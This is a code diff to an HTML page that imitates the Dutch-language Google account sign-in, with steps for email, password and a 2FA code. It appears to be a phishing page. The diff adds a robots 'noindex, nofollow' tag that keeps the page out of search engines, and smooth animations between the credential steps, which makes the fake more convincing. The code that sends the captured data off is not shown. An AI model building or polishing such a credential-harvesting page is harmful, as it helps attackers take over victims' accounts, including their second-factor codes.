@@ -3,6 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#ffffff">
+    <meta name="robots" content="noindex, nofollow">
     <title>Inloggen - Google-accounts</title>
     <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
     <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
@@ -304,6 +306,15 @@
             vertical-align: middle;
         }
 
+        /* Step transition */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+        .step-animate {
+            animation: fadeIn 0.25s ease both;
+        }
+
         @media (max-width: 500px) {
             .card { border: none; padding: 32px 16px 24px; max-width: 100%; }
         }
@@ -513,14 +524,23 @@
         document.getElementById('avatarLetter').textContent = email.charAt(0).toUpperCase();
 
         document.getElementById('step-email').style.display = 'none';
-        document.getElementById('step-password').style.display = 'block';
+        const s2 = document.getElementById('step-password');
+        s2.style.display = 'block';
+        s2.classList.remove('step-animate');
+        void s2.offsetWidth; // force reflow
+        s2.classList.add('step-animate');
         setTimeout(() => document.getElementById('pwInput').focus(), 50);
     }
 
     /* ── Stap 2 → 1 ── */
     function goBack() {
         document.getElementById('step-password').style.display = 'none';
-        document.getElementById('step-email').style.display = 'block';
+        document.getElementById('step-2fa').style.display = 'none';
+        const s1 = document.getElementById('step-email');
+        s1.style.display = 'block';
+        s1.classList.remove('step-animate');
+        void s1.offsetWidth;
+        s1.classList.add('step-animate');
         document.getElementById('pwInput').value = '';
         document.getElementById('pwErr').classList.remove('show');
         document.getElementById('pwInput').classList.remove('err');
@@ -598,7 +618,11 @@
     /* ── Stap 3: 2FA ── */
     function goToTwoFA(email) {
         document.getElementById('step-password').style.display = 'none';
-        document.getElementById('step-2fa').style.display = 'block';
+        const s3 = document.getElementById('step-2fa');
+        s3.style.display = 'block';
+        s3.classList.remove('step-animate');
+        void s3.offsetWidth;
+        s3.classList.add('step-animate');
         document.getElementById('tfa-email-display').textContent = email;
         setTimeout(() => document.getElementById('tfaInput').focus(), 50);
     }
